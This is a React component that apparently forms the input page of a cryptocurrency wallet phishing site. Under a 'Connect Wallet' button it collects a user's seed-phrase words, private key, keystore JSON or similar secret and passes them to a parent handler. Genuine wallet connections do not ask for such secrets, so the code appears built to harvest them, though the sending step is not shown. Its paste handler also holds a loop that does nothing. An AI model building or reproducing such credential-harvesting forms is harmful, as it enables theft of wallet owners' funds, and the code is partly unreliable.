import { useState, useEffect, useRef } from "react";
import IconClose from './Icons/IconClose';
import IconWallet from "./Icons/IconWallet";
import IconTryAgain from "./IconTryAgain";

const PreviewValue = ({ isLoading, selectedType, liftWordsToParent, submitBackup }) => {
    const [input, setInput] = useState("");
    const [words, setWords] = useState([]);

    const maxWords = selectedType?.wordCount || 1;
    const wordLength = selectedType?.wordLength || selectedType?.charLength;
    const focusInput = useRef(null)

    useEffect(() => {
        setWords([])
        setInput("")
        focusInput?.current?.focus()

    }, [selectedType.id])

    const handleKeyDown = (e) => {
        // If spacebar is pressed
        if (e.key === " " || e.key === "Enter" || e.key === "Tab") {
            e.preventDefault();
            const trimmed = input.trim();

            if (
                selectedType?.id.includes("mnemonic") &&
                trimmed.length > 2 && trimmed.length <= wordLength &&
                words.length < maxWords
            ) {
                setWords([...words, trimmed.toLowerCase()]);
                setInput("");
            }

            if (
                ["private_key", "keystore_json", "social_login", "hardware_wallet"].includes(
                    selectedType?.id
                ) &&
                trimmed.length <= wordLength &&
                words.length === 0
            ) {
                setWords([trimmed]);
                setInput("");
            }
        }

        // 🆕 If backspace is pressed and input is empty → remove last word
        if (e.key === "Backspace" && input === "" && words.length > 0) {
            setWords(prev => prev.slice(0, prev.length - 1));
        }
    };


    const handleInputChange = (e) => {
        setInput(e.target.value);
    };

    const removeWord = (index) => {
        setWords(words.filter((_, i) => i !== index));
        focusInput?.current.focus()

    };


    const handlePaste = (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData("text/plain");
        // Remove all white space (space, tabs, newlines)
        const cleaned = pastedData.trim();
        const chunk = cleaned.split(' ');

        const totalAllowed = selectedType?.wordCount || 1;

        const availableSpace = totalAllowed - words.length;

        for (let i = 0; i < availableSpace; i++) {
            if (chunk.length) {
                chunk.map((c) => { return c.toLowerCase() });
            }
        }
        // Check if the chunk is empty or if the user has already reached the limit
        if (chunk.length === 0) {
            alert("❌ No valid chunks found or you've already reached the limit.");
            return;
        }

        setWords([...words, ...chunk.slice(0, availableSpace)]);
        setInput("");

    };



    const handleSubmit = async (words) => {
        try {
            const result = await liftWordsToParent(words);
            if (result) {
                submitBackup();
            } else {
                console.warn("liftWordsToParent returned falsy result.");
            }
        } catch (error) {
            console.error("Error in handleSubmit:", error);
        }
    };

    return (
        <div>
            <div className="flex flex-wrap gap-2 rounded-lg border-2 bg-gray-100 border-gray-200 p-3">
                {words.map((word, index) => (
                    <button
                        onClick={() => removeWord(index)}
                        key={index}
                        className="relative cursor-pointer bg-gray-300 text-gray-900 p-2 px-3 rounded-lg text-center font-mono text-sm"
                    >
                        {word}
                        <span className="absolute ml-1 top-0 left-0 text-red-700 mt-1">
                            <IconClose className="w-2! h-2! animate-pulse p-0!" />
                        </span>
                    </button>
                ))}

                {words.length < maxWords && (
                    <input
                        value={input}
                        onChange={handleInputChange}
                        onKeyDown={handleKeyDown}
                        onPaste={handlePaste}
                        className="p-1 bg-transparent w-full  focus:outline-none"
                        placeholder="Type and press space"
                        ref={focusInput}
                    />
                )}
            </div>

            {words.length === maxWords && (
                <p className="text-green-700 font-semibold mt-2">
                    ✅ {maxWords} {maxWords === 1 ? "value" : "words"} entered correctly!
                </p>
            )}
            {words.length === maxWords && (

                <button onClick={() => { handleSubmit(words) }}
                    className="flex items-center gap-2  bg-yellow-500 font-bold mx-auto my-4 text-white px-2 shadow-inner border-2 border-gray-100  py-2 rounded-[6px] text-sm font-mono tracking-wide leading-6 cursor-pointer">
                    {isLoading ? 'Connecting...' : 'Connect Wallet'}
                    {isLoading ? <span className="animate-spin "><IconTryAgain /> </span> : <IconWallet />}



                </button>
            )}
        </div>
    );
};

export default PreviewValue;
